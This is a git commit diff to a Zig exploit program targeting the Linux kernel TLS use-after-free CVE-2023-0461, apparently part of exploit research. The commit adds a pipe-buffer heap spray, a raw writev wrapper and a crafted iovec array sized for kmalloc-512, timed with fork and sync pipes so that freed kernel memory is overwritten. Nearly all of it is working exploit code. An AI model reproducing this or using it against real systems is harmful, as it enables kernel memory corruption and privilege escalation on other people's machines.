68ef42c563b0b735d5feb8e68427e85577085d05
Richard Palethorpe <io@richiejp.com>
2023-08-30 12:37:46 +0100

    Add pipe spray, trigger GPF overwritting freeptr

--- src/xplt.zig
+++ src/xplt.zig
@@ -18,6 +18,10 @@ const TLS = struct {
     pub const RX = 2;
 };
 
+const F = struct {
+    pub const SETPIPE_SZ = 1024 + 7;
+};
+
 const CipherType = enum(u16) {
     AESGCM128 = 51,
 };
@@ -64,6 +68,37 @@ comptime {
 const TLSContext = extern struct {
     prot_info: TLSProtInfo,
 };
+
+// Zig std library doesn't consider possiblity of setting iov_base to null
+const iovec_const = extern struct {
+    iov_base: ?[*]const u8,
+    iov_len: usize,
+};
+
+pub fn writev(fd: os.fd_t, iov: []const iovec_const) os.WriteError!usize {
+    const iov_count = @as(u31, @intCast(iov.len));
+    while (true) {
+        const rc = l.syscall3(.writev, @as(usize, @bitCast(@as(isize, fd))), @intFromPtr(&iov), iov_count);
+        switch (errno(rc)) {
+            .SUCCESS => return @as(usize, @intCast(rc)),
+            .INTR => continue,
+            .INVAL => return error.InvalidArgument,
+            .FAULT => unreachable,
+            .AGAIN => return error.WouldBlock,
+            .BADF => return error.NotOpenForWriting, // Can be a race condition.
+            .DESTADDRREQ => unreachable, // `connect` was never called.
+            .DQUOT => return error.DiskQuota,
+            .FBIG => return error.FileTooBig,
+            .IO => return error.InputOutput,
+            .NOSPC => return error.NoSpaceLeft,
+            .PERM => return error.AccessDenied,
+            .PIPE => return error.BrokenPipe,
+            .CONNRESET => return error.ConnectionResetByPeer,
+            .BUSY => return error.DeviceBusy,
+            else => |err| return os.unexpectedErrno(err),
+        }
+    }
+}
 
 fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.socklen_t) !void {
     var n: u8 = 100;
@@ -147,8 +182,16 @@ fn cve_2023_0461() !void {
     const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
     const addr_sz = @sizeOf(@TypeOf(server_addr.sa));
 
+    const spray = try os.pipe();
+    _ = try os.fcntl(spray[0], F.SETPIPE_SZ, mem.page_size);
+    _ = try os.fcntl(spray[1], F.SETPIPE_SZ, mem.page_size);
+
     const sync = try SyncPipe.init();
     defer sync.deinit();
+
+    const target_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
+    defer os.closeSocket(target_sk);
+
     const child_pid = try os.fork();
 
     if (child_pid == 0) {
@@ -172,14 +215,33 @@ fn cve_2023_0461() !void {
         try retry_connect(client_sk, target_addr_p, addr_sz);
         try sync.wait(2);
 
+        os.nanosleep(5, 0);
+        log.info("child: unblock parent", .{});
+
+        {
+            var buf: [256]u8 = .{0x41} ** 256;
+            const len = try os.read(spray[0], &buf);
+
+            log.info("child: read {}: {s}", .{ len, std.fmt.fmtSliceEscapeLower(buf[0..len]) });
+        }
+
+        log.info("child: try overwrite iovec", .{});
+        try setTLSOpt(target_sk, .RX);
+
+        {
+            var buf: [256]u8 = .{0x42} ** 256;
+            const len = try os.read(spray[0], &buf);
+
+            log.info("child: read {}: {s}", .{ len, std.fmt.fmtSliceEscapeLower(buf[0..len]) });
+        }
+
+        try sync.cont(3);
+
         return;
     }
 
     defer _ = os.waitpid(child_pid, 0);
-
     log.info("parent: connect for first connection", .{});
-    const target_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
-    defer os.closeSocket(target_sk);
 
     try sync.wait(0);
     try retry_connect(target_sk, server_addr_p, addr_sz);
@@ -199,7 +261,28 @@ fn cve_2023_0461() !void {
     try sync.cont(2);
 
     log.info("parent: wait for deferred free", .{});
-    os.nanosleep(5, 5000000);
+    os.nanosleep(5, 0);
+
+    // 17 * 16 = 272 > 256 so that we are in kmalloc-512
+    const overwritten = [_]u8{ 'n', 'o', 'p', 'e' } ** 64;
+    const iov_zero = [1]iovec_const{.{ .iov_base = null, .iov_len = 0 }};
+    const iov_dummy = [1]iovec_const{.{
+        .iov_base = &overwritten,
+        .iov_len = overwritten.len,
+    }};
+    const iov: [17]iovec_const =
+        iov_dummy ++
+        (iov_zero ** 2) ++
+        iov_dummy ++
+        (iov_zero ** 13);
+
+    {
+        const len = try writev(spray[1], &iov);
+        if (len != 512)
+            log.err("parent: {} != 512", .{len});
+    }
+
+    try sync.wait(3);
 
     log.info("Goodbye!", .{});
 }
